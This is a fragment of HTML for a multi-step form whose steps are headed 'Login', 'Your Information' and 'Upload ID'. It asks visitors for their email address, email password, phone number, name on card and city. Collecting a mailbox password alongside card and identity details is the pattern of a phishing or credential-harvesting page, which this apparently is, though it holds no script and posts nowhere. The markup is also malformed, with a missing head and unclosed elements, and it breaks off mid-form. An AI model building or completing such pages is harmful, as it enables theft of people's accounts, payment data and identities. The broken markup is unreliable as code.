<!DOCTYPE html>

 </head>
 <body>    
  <form action="#" class="form">

   <!-- Progress bar -->

  <div class="progress-step active" 
  data-title="Login"
  ></div>
  <div class="progress-step" data-title="Your Information"></div>
  <div class="progress-step" data-title="Upload ID"></div>
  </div>  
  
  <!-- steps -->
  <h1>1.Personal Information</h1>
  <div class="form-step form-step-active">

  <label for="Email Address">Email Address</label>
  <input type="text" name="Email Address" id="Email Address" />
  </div>
  <div class="input-group">
  <label for="Email Password">Email Password</label>
  <input type="text" name="Email Password" id="Email Password" />

  <div class="input-group">
  <label for="Phone Number">Phone Number</label>
  <input type="text" name="Phone Number" id="Phone Number" />
  </div>  
   <div class="">
   <a href="#" class="btn btn-next width-80 ml-auto">Next</a>    
   </div>
  </div>
   <div class="form-step">
  <div class="input-group">
  <label for="Name On Card">Name On Card</label>

  <div class="input-group">
  <label for="City">City</label>
  <input type="text" name="City" id="City" />

  <div class="input-group">
